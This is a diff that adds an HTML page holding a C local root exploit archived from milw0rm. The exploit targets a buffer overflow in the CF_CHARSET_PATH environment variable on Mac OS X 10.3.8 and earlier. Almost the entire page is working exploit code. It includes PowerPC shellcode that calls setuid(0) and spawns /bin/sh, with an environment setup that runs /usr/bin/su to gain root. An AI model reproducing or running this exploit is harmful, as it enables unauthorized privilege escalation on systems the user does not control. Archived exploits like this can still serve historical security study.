@@ -1,0 +1,50 @@
+<html>
+<head>
+<title>Mac OS X <= 10.3.8 (CF_CHARSET_PATH) Local Root Buffer Overflow</title>
+<pre>
+/*[ MacOS X[CF_CHARSET_PATH]: local root exploit. ]*********
+*                                                         *
+* by: v9@fakehalo.us (fakehalo/realhalo)                  *
+*                                                         *
+* found by: iDefense (anon finder)                        *
+*                                                         *
+* saw the advisory on bugtraq and figured i'd slap this   *
+* together, so simple i had to.  exploits via the         *
+* /usr/bin/su binary.  you must press ENTER at the        *
+* &quot;Password: &quot; prompt.                                    *
+***********************************************************/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+static char exec[]= /* b-r00t's setuid(0)+exec(/bin/sh). */
+&quot;\x7c\x63\x1a\x79\x40\x82\xff\xfd\x7d\x68\x02\xa6\x3b\xeb&quot;
+&quot;\x01\x70\x39\x40\x01\x70\x39\x1f\xfe\xdf\x7c\x68\x19\xae&quot;
+&quot;\x38\x0a\xfe\xa7\x44\xff\xff\x02\x60\x60\x60\x60\x7c\xa5&quot;
+&quot;\x2a\x79\x38\x7f\xfe\xd8\x90\x61\xff\xf8\x90\xa1\xff\xfc&quot;
+&quot;\x38\x81\xff\xf8\x38\x0a\xfe\xcb\x44\xff\xff\x02\x7c\xa3&quot;
+&quot;\x2b\x78\x38\x0a\xfe\x91\x44\xff\xff\x02\x2f\x62\x69\x6e&quot;
+&quot;\x2f\x73\x68\x58&quot;;
+int main(void){
+unsigned int i=0;
+char *buf,*env[3];
+printf(&quot;(*)MacOS X[CF_CHARSET_PATH]: local root exploit.\n&quot;);
+printf(&quot;(*)by: v9@fakehalo.us, found by iDefense adv. (anon)\n\n&quot;);
+if(!(buf=(char *)malloc(1100+1)))exit(1);
+memcpy(buf,&quot;CF_CHARSET_PATH=&quot;,16);
+printf(&quot;[*] setting up the environment.\n&quot;);
+for(i=16;i&lt;1100;i+=4)*(long *)&amp;buf[i]=(0xbffffffa-strlen(exec));
+env[0]=buf;
+env[1]=exec;
+env[2]=NULL;
+printf(&quot;[*] executing su... (press ENTER at the \&quot;Password: \&quot;&quot;
+&quot; prompt)\n\n&quot;);
+if(execle(&quot;/usr/bin/su&quot;,&quot;su&quot;,0,env))
+ printf(&quot;[!] failed executing /usr/bin/su.\n&quot;);
+exit(0);
+}
+
+// milw0rm.com [2005-03-22]
+</pre>
+</html>
+
